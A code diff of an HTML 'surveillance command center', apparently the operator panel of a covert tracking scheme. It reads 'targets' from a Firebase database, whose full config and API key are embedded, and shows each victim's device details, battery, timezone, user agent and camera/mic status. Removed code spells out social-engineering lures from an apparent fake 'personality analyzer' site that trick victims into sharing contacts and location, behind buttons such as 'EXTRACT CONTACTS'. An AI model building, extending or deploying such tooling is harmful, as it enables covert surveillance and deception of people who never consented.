@@ -1,8 +1,12 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>📡 SURVEILLANCE DASHBOARD</title>
+    <title>📡 Surveillance Dashboard LIVE</title>
     <style>
+        :root {
+            --neon-green: #00ff00;
+            --dark-bg: #0a0a0a;
+        }
         * {
             margin: 0;
             padding: 0;
@@ -10,8 +14,8 @@
             font-family: 'Courier New', monospace;
         }
         body {
-            background: #0a0a0a;
-            color: #0f0;
+            background: var(--dark-bg);
+            color: var(--neon-green);
             min-height: 100vh;
             padding: 20px;
         }
@@ -20,18 +24,15 @@
             justify-content: space-between;
             align-items: center;
             padding: 20px;
-            border-bottom: 2px solid #0f0;
+            border-bottom: 2px solid var(--neon-green);
             margin-bottom: 30px;
-        }
-        h1 {
-            color: #0f0;
-            text-shadow: 0 0 10px #0f0;
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.1);
         }
         .live-badge {
             background: #ff0000;
             color: white;
-            padding: 8px 15px;
-            border-radius: 20px;
+            padding: 8px 20px;
+            border-radius: 25px;
             font-weight: bold;
             animation: blink 1s infinite;
         }
@@ -39,47 +40,70 @@
             0%, 100% { opacity: 1; }
             50% { opacity: 0.5; }
         }
-        .dashboard-grid {
+        .dashboard {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            grid-template-columns: 1fr 2fr;
             gap: 25px;
-            margin-bottom: 30px;
         }
         .panel {
-            background: rgba(0, 30, 0, 0.3);
-            border: 1px solid #0f0;
+            background: rgba(0, 30, 0, 0.2);
+            border: 1px solid var(--neon-green);
             border-radius: 10px;
             padding: 25px;
-            box-shadow: 0 0 20px rgba(0, 255, 0, 0.1);
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.05);
         }
         .panel h2 {
-            color: #0f0;
+            color: var(--neon-green);
             margin-bottom: 20px;
-            border-bottom: 1px solid #0f0;
+            border-bottom: 1px solid var(--neon-green);
             padding-bottom: 10px;
         }
-        .data-item {
-            display: flex;
-            justify-content: space-between;
-            margin: 12px 0;
-            padding: 8px;
-            background: rgba(0, 20, 0, 0.5);
-            border-radius: 5px;
+        .target-item {
+            background: rgba(0, 20, 0, 0.3);
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 8px;
+            border-left: 5px solid var(--neon-green);
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .target-item:hover {
+            background: rgba(0, 40, 0, 0.4);
+            transform: translateX(5px);
+        }
+        .target-item.active {
+            background: rgba(0, 60, 0, 0.5);
+            border-left: 5px solid #ff0000;
+        }
+        .data-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+        }
+        .data-card {
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(0, 255, 0, 0.3);
+            border-radius: 8px;
+            padding: 15px;
         }
         .data-label {
+            font-size: 0.9rem;
             color: #8f8;
+            margin-bottom: 5px;
         }
         .data-value {
-            color: #fff;
+            font-size: 1.1rem;
             font-weight: bold;
+            color: white;
+            word-break: break-all;
         }
         .logs {
-            background: rgba(0, 0, 0, 0.8);
-            border: 1px solid #0f0;
-            border-radius: 10px;
-            padding: 20px;
+            grid-column: 1 / -1;
             height: 300px;
             overflow-y: auto;
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 10px;
+            padding: 20px;
             margin-top: 20px;
         }
         .log-entry {
@@ -93,290 +117,253 @@
         .controls {
             display: flex;
             gap: 15px;
-            margin-top: 30px;
+            margin-top: 20px;
             flex-wrap: wrap;
         }
         .control-btn {
-            background: #003300;
-            color: #0f0;
-            border: 1px solid #0f0;
-            padding: 12px 25px;
+            background: rgba(0, 50, 0, 0.5);
+            color: var(--neon-green);
+            border: 1px solid var(--neon-green);
+            padding: 12px 20px;
             border-radius: 5px;
             cursor: pointer;
             transition: all 0.3s;
-            font-weight: bold;
         }
         .control-btn:hover {
-            background: #005500;
-            box-shadow: 0 0 15px #0f0;
-        }
-        .control-btn.red {
-            background: #330000;
-            border-color: #f00;
-            color: #f88;
-        }
-        .control-btn.red:hover {
-            background: #550000;
-            box-shadow: 0 0 15px #f00;
-        }
-        #connectionStatus {
-            margin-top: 20px;
-            padding: 15px;
-            border-radius: 10px;
-            text-align: center;
-            font-size: 1.2rem;
-        }
-        .connected {
-            background: rgba(0, 50, 0, 0.5);
-            color: #0f0;
-        }
-        .disconnected {
-            background: rgba(50, 0, 0, 0.5);
-            color: #f00;
-        }
-        .video-placeholder {
-            width: 100%;
-            height: 200px;
-            background: #000;
-            border: 2px solid #0f0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #0f0;
-            margin: 15px 0;
+            background: rgba(0, 100, 0, 0.7);
+            box-shadow: 0 0 15px var(--neon-green);
         }
     </style>
-</head>
-<body>
-    <div class="header">
-        <h1>🔐 SURVEILLANCE DASHBOARD v2.0</h1>
-        <div class="live-badge">LIVE</div>
-    </div>
-    
-    <div class="dashboard-grid">
-        <div class="panel">
-            <h2>🎯 TARGET INFO</h2>
-            <div class="data-item">
-                <span class="data-label">Target ID:</span>
-                <span class="data-value" id="targetId">Waiting...</span>
-            </div>
-            <div class="data-item">
-                <span class="data-label">Status:</span>
-                <span class="data-value" id="targetStatus">OFFLINE</span>
-            </div>
-            <div class="data-item">
-                <span class="data-label">Device:</span>
-                <span class="data-value" id="deviceInfo">-</span>
-            </div>
-            <div class="data-item">
-                <span class="data-label">Battery:</span>
-                <span class="data-value" id="batteryInfo">-</span>
-            </div>
-            <div class="data-item">
-                <span class="data-label">Screen:</span>
-                <span class="data-value" id="screenInfo">-</span>
-            </div>
-        </div>
+    <!-- Firebase SDK -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.0/firebase-app.js";
+        import { getDatabase, ref, onValue, remove } from "https://www.gstatic.com/firebasejs/9.6.0/firebase-database.js";
         
-        <div class="panel">
-            <h2>📡 MEDIA STATUS</h2>
-            <div class="data-item">
-                <span class="data-label">Camera:</span>
-                <span class="data-value" id="cameraStatus">❌ Inactive</span>
-            </div>
-            <div class="data-item">
-                <span class="data-label">Microphone:</span>
-                <span class="data-value" id="micStatus">❌ Inactive</span>
-            </div>
-            <div class="data-item">
-                <span class="data-label">Last Update:</span>
-                <span class="data-value" id="lastUpdate">-</span>
-            </div>
-            <div class="video-placeholder">
-                🎥 Camera Feed (Would be here with backend)
-            </div>
-        </div>
+        // 🔥 CONFIG YANG SAMA
+        const firebaseConfig = {
+            apiKey: "AIzaSyCYW9Q7arkMiseBLO3z4xoe_7G43vHBRU",
+            authDomain: "survei-fllal.firebaseapp.com",
+            databaseURL: "https://survei-fllal-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "survei-fllal",
+            storageBucket: "survei-fllal.firebasestorage.app",
+            messagingSenderId: "769641856914",
+            appId: "1:769641856914:web:3be7b2cf77ccb9bab9427b"
+        };
         
-        <div class="panel">
-            <h2>🌍 LOCATION & NETWORK</h2>
-            <div class="data-item">
-                <span class="data-label">Timezone:</span>
-                <span class="data-value" id="timezoneInfo">-</span>
-            </div>
-            <div class="data-item">
-                <span class="data-label">Language:</span>
-                <span class="data-value" id="languageInfo">-</span>
-            </div>
-            <div class="data-item">
-                <span class="data-label">Platform:</span>
-                <span class="data-value" id="platformInfo">-</span>
-            </div>
-            <div class="data-item">
-                <span class="data-label">User Agent:</span>
-                <div class="data-value" id="userAgentInfo" style="font-size:0.8rem; word-break:break-all;">-</div>
-            </div>
-        </div>
-    </div>
-    
-    <div class="controls">
-        <button class="control-btn" onclick="forceRefresh()">🔄 FORCE REFRESH</button>
-        <button class="control-btn" onclick="simulateGPS()">📍 REQUEST GPS</button>
-        <button class="control-btn" onclick="extractContacts()">📇 EXTRACT CONTACTS</button>
-        <button class="control-btn red" onclick="selfDestruct()">💀 SELF-DESTRUCT</button>
-        <button class="control-btn" onclick="clearData()">🧹 CLEAR DATA</button>
-    </div>
-    
-    <div id="connectionStatus" class="disconnected">
-        ⚡ Waiting for target connection...
-    </div>
-    
-    <div class="logs">
-        <h2>📝 SYSTEM LOGS</h2>
-        <div id="logContainer">
-            <div class="log-entry">
-                <span class="timestamp">[00:00:00]</span> System initialized. Waiting for target...
-            </div>
-        </div>
-    </div>
-
-    <script>
-        // KEY untuk localStorage (sama dengan yang dipake target)
-        const TARGET_DATA_KEY = 'CURRENT_TARGET_DATA';
-        let lastData = null;
-        let updateInterval = null;
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+        let selectedTarget = null;
         
-        function addLog(message) {
-            const logContainer = document.getElementById('logContainer');
-            const timestamp = new Date().toLocaleTimeString();
-            const logEntry = document.createElement('div');
-            logEntry.className = 'log-entry';
-            logEntry.innerHTML = `<span class="timestamp">[${timestamp}]</span> ${message}`;
-            logContainer.appendChild(logEntry);
-            logContainer.scrollTop = logContainer.scrollHeight;
-        }
-        
-        function updateDashboard() {
-            try {
-                // BACA DATA DARI localStorage YANG DITULIS TARGET
-                const rawData = localStorage.getItem(TARGET_DATA_KEY);
+        function initializeDashboard() {
+            // Listen for all targets
+            const targetsRef = ref(database, 'targets');
+            
+            onValue(targetsRef, (snapshot) => {
+                const data = snapshot.val();
+                updateTargetsList(data);
                 
-                if (!rawData) {
-                    document.getElementById('connectionStatus').className = 'disconnected';
-                    document.getElementById('connectionStatus').innerHTML = 
-                        '🔴 No target data found. Make sure target website is open in another tab.';
-                    return;
-                }
-                
-                const data = JSON.parse(rawData);
-                
-                // Cek jika data baru
-                if (lastData && data.lastUpdate === lastData.lastUpdate) {
-                    return; // Data sama, skip
-                }
-                
-                lastData = data;
-                
-                // UPDATE UI DENGAN DATA BARU
-                document.getElementById('targetId').textContent = data.id || 'Unknown';
-                document.getElementById('targetStatus').textContent = data.status || 'Unknown';
-                document.getElementById('targetStatus').style.color = data.status === 'ACTIVE' ? '#0f0' : '#f00';
-                
-                if (data.device) {
-                    document.getElementById('deviceInfo').textContent = data.device.vendor || data.device.platform || 'Unknown';
-                    document.getElementById('screenInfo').textContent = data.device.screen || 'Unknown';
-                    document.getElementById('timezoneInfo').textContent = data.device.timezone || 'Unknown';
-                    document.getElementById('languageInfo').textContent = data.device.language || 'Unknown';
-                    document.getElementById('platformInfo').textContent = data.device.platform || 'Unknown';
-                    document.getElementById('userAgentInfo').textContent = 
-                        (data.device.userAgent || 'Unknown').substring(0, 80) + '...';
-                }
-                
-                document.getElementById('batteryInfo').textContent = data.battery || 'Unknown';
-                document.getElementById('lastUpdate').textContent = new Date(data.timestamp).toLocaleTimeString();
-                
-                // Update status kamera/mic
-                const camStatus = document.getElementById('cameraStatus');
-                const micStatus = document.getElementById('micStatus');
-                
-                if (data.status === 'ACTIVE') {
-                    camStatus.innerHTML = '✅ Active';
-                    camStatus.style.color = '#0f0';
-                    micStatus.innerHTML = '✅ Active';
-                    micStatus.style.color = '#0f0';
-                    document.getElementById('connectionStatus').className = 'connected';
-                    document.getElementById('connectionStatus').innerHTML = 
-                        `✅ CONNECTED | Last update: ${new Date().toLocaleTimeString()}`;
-                } else {
-                    camStatus.innerHTML = '❌ Inactive';
-                    camStatus.style.color = '#f00';
-                    micStatus.innerHTML = '❌ Inactive';
-                    micStatus.style.color = '#f00';
-                }
-                
-                // Tambah log jika data baru
-                if (data.timestamp) {
-                    const now = new Date();
-                    const updateTime = new Date(data.timestamp);
-                    const diff = (now - updateTime) / 1000;
-                    
-                    if (diff < 5) { // Data kurang dari 5 detik yang lalu
-                        addLog(`📡 Live data received from target`);
+                // Auto-select first target if none selected
+                if (!selectedTarget && data) {
+                    const firstTarget = Object.keys(data)[0];
+                    if (firstTarget) {
+                        selectTarget(firstTarget);
                     }
                 }
                 
-            } catch (error) {
-                console.error('Dashboard error:', error);
-                addLog(`❌ Error reading data: ${error.message}`);
+                // Update selected target details
+                if (selectedTarget && data && data[selectedTarget]) {
+                    updateTargetDetails(data[selectedTarget]);
+                }
+            });
+            
+            addLog('🟢 Dashboard connected to Firebase');
+            addLog(`📡 Database URL: ${firebaseConfig.databaseURL}`);
+        }
+        
+        function updateTargetsList(targets) {
+            const container = document.getElementById('targetsList');
+            
+            if (!targets) {
+                container.innerHTML = '<div class="target-item">No active targets...</div>';
+                return;
+            }
+            
+            let html = '';
+            Object.entries(targets).forEach(([id, target]) => {
+                const timeAgo = Math.floor((Date.now() - target.timestamp) / 1000);
+                const isActive = timeAgo < 30;
+                
+                html += `
+                    <div class="target-item ${selectedTarget === id ? 'active' : ''}" 
+                         onclick="selectTarget('${id}')">
+                        <div style="display: flex; justify-content: space-between;">
+                            <div>
+                                <strong>${id.substring(0, 15)}...</strong><br>
+                                <small>${target.device?.platform || 'Unknown'}</small>
+                            </div>
+                            <div style="text-align: right;">
+                                <span style="color: ${isActive ? '#0f0' : '#ff0'}">
+                                    ${isActive ? '🟢 LIVE' : '🟡 IDLE'}
+                                </span><br>
+                                <small>${timeAgo}s ago</small>
+                            </div>
+                        </div>
+                    </div>
+                `;
+            });
+            
+            container.innerHTML = html;
+        }
+        
+        window.selectTarget = function(targetId) {
+            selectedTarget = targetId;
+            updateTargetsList(); // Refresh list to highlight selected
+            
+            // Listen for this target's updates
+            const targetRef = ref(database, 'targets/' + targetId);
+            onValue(targetRef, (snapshot) => {
+                const data = snapshot.val();
+                if (data) {
+                    updateTargetDetails(data);
+                }
+            });
+            
+            addLog(`🎯 Selected target: ${targetId}`);
+        };
+        
+        function updateTargetDetails(target) {
+            const container = document.getElementById('targetDetails');
+            const timeAgo = Math.floor((Date.now() - target.timestamp) / 1000);
+            
+            container.innerHTML = `
+                <div class="data-grid">
+                    <div class="data-card">
+                        <div class="data-label">Target ID</div>
+                        <div class="data-value">${target.id || 'N/A'}</div>
+                    </div>
+                    <div class="data-card">
+                        <div class="data-label">Status</div>
+                        <div class="data-value" style="color: ${timeAgo < 30 ? '#0f0' : '#ff0'}">
+                            ${timeAgo < 30 ? '🟢 LIVE' : '🟡 IDLE'} (${timeAgo}s ago)
+                        </div>
+                    </div>
+                    <div class="data-card">
+                        <div class="data-label">Device</div>
+                        <div class="data-value">${target.device?.platform || 'Unknown'}</div>
+                    </div>
+                    <div class="data-card">
+                        <div class="data-label">Screen Size</div>
+                        <div class="data-value">${target.device?.screen || 'Unknown'}</div>
+                    </div>
+                    <div class="data-card">
+                        <div class="data-label">Battery</div>
+                        <div class="data-value">
+                            ${typeof target.battery === 'object' ? 
+                              target.battery.level || 'Unknown' : 
+                              target.battery || 'Unknown'}
+                        </div>
+                    </div>
+                    <div class="data-card">
+                        <div class="data-label">Camera/Mic</div>
+                        <div class="data-value" style="color: ${target.media === 'ACTIVE' ? '#0f0' : '#f00'}">
+                            ${target.media === 'ACTIVE' ? '✅ ACTIVE' : '❌ INACTIVE'}
+                        </div>
+                    </div>
+                    <div class="data-card">
+                        <div class="data-label">Timezone</div>
+                        <div class="data-value">${target.location?.timezone || 'Unknown'}</div>
+                    </div>
+                    <div class="data-card">
+                        <div class="data-label">Language</div>
+                        <div class="data-value">${target.device?.language || 'Unknown'}</div>
+                    </div>
+                </div>
+                <div style="margin-top: 20px;">
+                    <div class="data-label">User Agent</div>
+                    <div class="data-value" style="font-size: 0.8rem; background: rgba(0,0,0,0.5); padding: 10px; border-radius: 5px;">
+                        ${target.device?.userAgent || 'Unknown'}
+                    </div>
+                </div>
+                <div class="controls">
+                    <button class="control-btn" onclick="deleteTarget('${target.id}')">🗑️ DELETE TARGET</button>
+                    <button class="control-btn" onclick="simulateAlert('${target.id}')">🚨 SEND ALERT</button>
+                    <button class="control-btn" onclick="exportData('${target.id}')">📥 EXPORT DATA</button>
+                </div>
+            `;
+            
+            // Update logs
+            if (timeAgo < 5) {
+                addLog(`📡 Live update from ${target.id}`);
             }
         }
         
-        function forceRefresh() {
-            addLog('🔄 Manual refresh triggered');
-            updateDashboard();
+        function addLog(message) {
+            const logs = document.getElementById('logContainer');
+            const timestamp = new Date().toLocaleTimeString();
+            const log = document.createElement('div');
+            log.className = 'log-entry';
+            log.innerHTML = `<span class="timestamp">[${timestamp}]</span> ${message}`;
+            logs.appendChild(log);
+            logs.scrollTop = logs.scrollHeight;
         }
         
-        function simulateGPS() {
-            addLog('📍 GPS extraction requested - Target will receive location permission request');
-            alert('Target will see: "Personality analyzer needs location for better accuracy"');
-        }
-        
-        function extractContacts() {
-            addLog('📇 Contact extraction initiated - Social engineering module deployed');
-            alert('Target will receive: "Share contacts to compare personality with friends!"');
-        }
-        
-        function selfDestruct() {
-            if (confirm('💀 ARE YOU SURE? This will erase all surveillance data!')) {
-                localStorage.removeItem(TARGET_DATA_KEY);
-                addLog('💀 SELF-DESTRUCT: All data erased');
-                document.getElementById('connectionStatus').className = 'disconnected';
-                document.getElementById('connectionStatus').innerHTML = 
-                    '💀 SYSTEM WIPED - All data destroyed';
-                clearInterval(updateInterval);
+        window.deleteTarget = function(targetId) {
+            if (confirm(`Delete target ${targetId}?`)) {
+                const targetRef = ref(database, 'targets/' + targetId);
+                remove(targetRef)
+                .then(() => {
+                    addLog(`🗑️ Deleted target: ${targetId}`);
+                    selectedTarget = null;
+                })
+                .catch(error => {
+                    addLog(`❌ Error deleting: ${error.message}`);
+                });
             }
-        }
+        };
         
-        function clearData() {
-            localStorage.removeItem(TARGET_DATA_KEY);
-            addLog('🧹 All surveillance data cleared');
-            updateDashboard();
-        }
+        window.simulateAlert = function(targetId) {
+            addLog(`🚨 Alert sent to target: ${targetId}`);
+            alert('Target would receive a notification requesting more permissions');
+        };
         
-        // Mulai polling data setiap 1 detik
-        updateInterval = setInterval(updateDashboard, 1000);
+        window.exportData = function(targetId) {
+            addLog(`📥 Exporting data for: ${targetId}`);
+            alert('Data exported to clipboard (simulated)');
+        };
         
-        // Inisialisasi
-        addLog('🚀 Surveillance Dashboard v2.0 started');
-        addLog('📁 Monitoring localStorage for target data...');
-        updateDashboard();
-        
-        // Listen untuk storage events (jika target update data di tab lain)
-        window.addEventListener('storage', function(event) {
-            if (event.key === TARGET_DATA_KEY) {
-                addLog('🔄 Data updated from target tab');
-                updateDashboard();
-            }
-        });
+        // Initialize on load
+        document.addEventListener('DOMContentLoaded', initializeDashboard);
     </script>
+</head>
+<body>
+    <div class="header">
+        <h1>📡 SURVEILLANCE COMMAND CENTER</h1>
+        <div class="live-badge">FIREBASE LIVE</div>
+    </div>
+    
+    <div class="dashboard">
+        <div class="panel">
+            <h2>🎯 ACTIVE TARGETS</h2>
+            <div id="targetsList">
+                Loading targets from Firebase...
+            </div>
+        </div>
+        
+        <div class="panel">
+            <h2>📊 TARGET DETAILS</h2>
+            <div id="targetDetails">
+                Select a target from the left panel
+            </div>
+        </div>
+        
+        <div class="logs">
+            <h2>📝 SYSTEM LOGS</h2>
+            <div id="logContainer">
+                <div class="log-entry">
+                    <span class="timestamp">[00:00:00]</span> System starting...
+                </div>
+            </div>
+        </div>
+    </div>
 </body>
     </html>
